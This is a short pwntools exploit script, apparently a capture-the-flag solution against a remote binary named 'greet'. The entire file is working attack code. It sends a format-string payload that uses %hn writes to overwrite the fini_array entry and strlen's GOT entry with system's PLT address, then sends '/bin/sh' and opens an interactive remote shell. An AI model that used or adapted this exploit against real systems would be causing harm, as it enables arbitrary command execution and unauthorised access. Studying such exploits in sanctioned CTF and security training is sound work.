from pwn import *
# sh=process('./greet')
sh=remote('159.138.137.79',61249)
elf=ELF('./greet')
fini_array=0x08049934
start=0x080484f0
system_plt=0x8048490
strlen_got=elf.got['strlen']
print "strlen_got: "+hex(strlen_got)
print "system_plt: "+hex(system_plt)
print "fini_array: "+hex(fini_array)
print "start: "+hex(start)
sh.recv()
payload='aa'+p32(fini_array)+p32(strlen_got+2)
payload+=p32(strlen_got)+'%34000c%12$hn'
payload+='%33556c%13$hn'
payload+='%31884c%14$hn'
sh.sendline(payload)
sh.recv()
sh.sendline('/bin/sh\x00')
sh.interactive()